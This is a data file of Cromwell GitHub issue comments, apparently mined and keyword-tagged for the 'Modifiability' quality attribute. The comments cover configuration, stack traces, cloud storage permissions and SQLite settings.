comment._",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-487771736:1393,config,config,1393,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-487771736,1,['config'],['config']
Modifiability,`ConfigFactory.load()` [caches](http://typesafehub.github.io/config/latest/api/com/typesafe/config/ConfigFactory.html#load--) the config on the first call and returns the same singleton config until someone calls [invalidateCaches](http://typesafehub.github.io/config/latest/api/com/typesafe/config/ConfigFactory.html#invalidateCaches--),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-234338917:1,Config,ConfigFactory,1,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-234338917,9,"['Config', 'config']","['ConfigFactory', 'config']"
Modifiability,`StandardAsyncExecutionActor.scala` doesn't have PAPI in the name but I think this is also probably something we don't want to touch until Batch. I even started a [major refactor](https://github.com/broadinstitute/cromwell/compare/develop...aen_wx_1625) but decided to postpone for now.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7430#issuecomment-2108031269:170,refactor,refactor,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7430#issuecomment-2108031269,1,['refactor'],['refactor']
Modifiability,"`ThrowableWithErrors` is in `wdl4s`, or will be if/when https://github.com/broadinstitute/wdl4s/pull/3 is merged. We could put it in Cromwell too I guess but then the custom Exception class in wdl4s could not extend it which would make it more annoying to use in Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/368#issuecomment-171043307:209,extend,extend,209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/368#issuecomment-171043307,1,['extend'],['extend']
Modifiability,"```. 2017/02/07 15:40:50 I: Switching to status: pulling-image; 2017/02/07 15:40:50 I: Calling SetOperationStatus(pulling-image); 2017/02/07 15:40:50 I: SetOperationStatus(pulling-image) succeeded; 2017/02/07 15:40:50 I: Writing new Docker configuration file; 2017/02/07 15:40:50 I: Pulling image ""leetl1220/m1:bs""; 2017/02/07 15:41:48 I: Pulled image ""leetl1220/m1:bs"" successfully.; 2017/02/07 15:41:48 I: Switching to status: localizing-files; 2017/02/07 15:41:48 I: Calling SetOperationStatus(localizing-files); 2017/02/07 15:41:48 I: SetOperationStatus(localizing-files) succeeded; 2017/02/07 15:41:48 I: Docker file /cromwell_root/exec.sh maps to host; location /mnt/local-disk/exec.sh.; 2017/02/07 15:41:48 I: Copying; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; to /mnt/local-disk/exec.sh; 2017/02/07 15:41:48 I: Running command: sudo gsutil -q -m cp; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; /mnt/local-disk/exec.sh; 2017/02/07 15:41:49 I: Docker file; /cromwell_root/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:4",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:240,config,configuration,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['config'],['configuration']
Modifiability,`gcr.io` domains come and go: https://github.com/GoogleCloudPlatform/cloudsql-proxy/issues/59. If we don't want to keep requiring a recompile + redeploy whenever gcr creates or removes a new subdomain this fix should be more flexible.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4466#issuecomment-444902132:225,flexible,flexible,225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4466#issuecomment-444902132,1,['flexible'],['flexible']
Modifiability,"a way to reproduce with `gsutil cp`, as @aednichols suggested (in my case Cromwell runs with service account `30148356615-compute@developer.gserviceaccount.com`):; ```; $ gcloud config set account giulio@broadinstitute.org; Updated property [core/account].; $ gcloud auth list; Credentialed Accounts; ACTIVE ACCOUNT; 30148356615-compute@developer.gserviceaccount.com; giulio.genovese@gmail.com; * giulio@broadinstitute.org. To set the active account, run:; $ gcloud config set account `ACCOUNT`. $ gsutil cp gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai /tmp/. Copying gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai...; / [1 files][143.2 KiB/143.2 KiB]; Operation completed over 1 objects/143.2 KiB.; $ gcloud config set account 30148356615-compute@developer.gserviceaccount.com; Updated property [core/account].; $ gcloud auth list; Credentialed Accounts; ACTIVE ACCOUNT; * 30148356615-compute@developer.gserviceaccount.com; giulio.genovese@gmail.com; giulio@broadinstitute.org. To set the active account, run:; $ gcloud config set account `ACCOUNT`. $ gsutil cp gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram.crai /tmp/; AccessDeniedException: 403 30148356615-compute@developer.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage bucket.; ```. So in this case the more appropriate questions would be:; 1) How do I get to have my service account `30148356615-compute@developer.gserviceaccount.com` have the same permissions as my personal account `giulio@broadinstitute.org`?; 2) How do I get Cromwell to run with my personal account `giulio@broadinstitute.org",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665434782:989,config,config,989,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665434782,1,['config'],['config']
Modifiability,"a.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more; ```; This is our configuration for PBS:; ```; PBSPRO {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; ; runtime-attributes = """"""; Int cpu = 1; Int memory_mb = 2048; String queue = ""normal""; String account = """"; String walltime = ""48:00:00""; ; Int? cpuMin; Int? cpuMax; Int? memoryMin; Int? memoryMax; String? outDirMin; String? outDirMax; String? tmpDirMin; String? tmpDirMax; """"""; submit = """"""; qsub -V -l wd -N ${job_name} -o ${out} -e ${err} -q ${queue} -l walltime=${walltime} -l ncpus=${cpu} -l mem=${memory_mb}mb -- /usr/bin/env bash ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+).*""; filesystems {. local {; localizat",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:4019,config,config,4019,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['config'],['config']
Modifiability,"a.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:3377,Config,ConfigAsyncJobExecutionActor,3377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,a.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); 	at akka.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:1614,Config,ConfigAsyncJobExecutionActor,1614,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,2,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,a:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:644); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:959); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:951); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.$anonfun$applyOrElse$3(Retry.scala:45); 	at akka.pattern.FutureTimeoutSupport.liftedTree1$1(FutureTimeoutSupport.scala:26); 	at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:2904,Config,ConfigAsyncJobExecutionActor,2904,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"additional tests](https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519) (and something entirely different) that it made me step back. I had this growing feeling that started to solidify that there are too many layers. I am developing things and I **still** don't understand (or think Singularity is ready yet) to be any kind of backend. I'm forcing a dog into a cat shaped hole just because this is the hole I'm supposed to fill. Is that a good idea? I've lost sight of what the tool is trying to do. Cromwell is trying to make it easy to run a Singularity container. But if that's the case, then why has this command:. ```bash; singularity run shub://vsoch/hello-world; ```. turned into needing Cromwell (java and the jar), an inputs json file, a wdl specification, a backend configuration, and a runtime command that I can't seem to remember, and then the entire thing takes much longer than an instance to echo a tiny Rawwwwr! If this is the goal we are going for, is this making life easier for the scientist? If I'm a programmer person, and this is the minimum I am allowed for this to just run a simple container, what happens when it gets harder? I realized that without a proper services API, singularity is no more special than python, bash, samtools, it's just a binary. . And I realize also that it's easy to get caught up in details like ""Should we use Travis or Circle?"" Does it work on Amazon with this kind of input? And there will always be bugs! But I think the forest is being a bit lost for the trees. . ## Question 4: What is the direction to go in?. You can probably take what I'm saying with a grain of salt because I'm new to this entire universe, and there is so much invested there is no turning back or rethinking. But all of this seems too complicated, and too hard. What is needed is a solution that is just really stupid and simple. You have a container that understands its data. You point the container at a dataset and run it. You outsource the w",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:9784,config,configuration,9784,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,1,['config'],['configuration']
Modifiability,"ader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider.java:46); 	at software.amazon.awssdk.core.internal.http.loader.DefaultSdkHttpClientBuilder.buildWithDefaults(DefaultSdkHttpClientBuilder.java:40); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.lambda$resolveSyncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:22); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.build(SdkDefaultClientBuilder.java:119); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:77); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 more. 2019-07-02 19:16:37,991 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowManagerActor WorkflowActor-10f172e8-b7ba-416f-964e-22ab8c7b38e3 is in a terminal state: WorkflowFailedState",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:16256,adapt,adapted,16256,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['adapt'],['adapted']
Modifiability,"akka.dispatchers.engine-dispatcher-29 INFO - WorkflowManagerActor WorkflowActor-796f3949-47e6-497e-9458-59ab53a063c6 is in a terminal state: WorkflowSucceededState; 2020-06-04 21:43:43,504 cromwell-system-akka.actor.default-dispatcher-56 ERROR - Carboniting failure: cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.. Marking as TooLargeToArchive; cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.; 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:283); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:267); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:38); 	at akka.actor.FSM.processEvent(FSM.scala:707); 	at akka.actor.FSM.processEvent$(FSM.scala:704); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor.akka$actor$LoggingFSM$$super$processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.LoggingFSM.processEvent(FSM.scala:847); 	at akka.actor.LoggingFSM.processEvent$(FSM.scala:829); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor.processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.FSM.akka$actor$FSM$$processMsg(FSM.scala:701); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:695); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073:1066,Config,Configured,1066,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-639142073,1,['Config'],['Configured']
Modifiability,"al file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initially:. ```HOCON; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text&journal_mode=truncate""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:?foreign_keys=true&date_class=text""; numThreads=1; }; }; }; ```; This limits the amount of IO operations to the bare minimum to get call-caching working. With this configuration cromwell was able to rerun the callcached 1000+ job workflow in ~25 minutes. However it crashed when it needed to write jobs failing with a SQLite error reporting no such table: `METADATA_ENTRY`. EDIT3: I found that using the SQLite in-memory database allows Cromwell to exceed limits that are set using `-Xmx=1G` for instance. I think this is acceptable, as SQLite does not create very large databases and it allows for using Cromwell with the same setting everywhere, no matter whether the workflow is large or small. It is a gotcha to be aware of, however.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:2712,config,configuration,2712,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906,1,['config'],['configuration']
Modifiability,"ala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more; ```. Works as expected with cromwell-36",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:6623,config,config,6623,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,4,"['Config', 'config']","['ConfigAsyncJobExecutionActor', 'config']"
Modifiability,"aning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-9",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1341,config,configuration,1341,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['config'],['configuration']
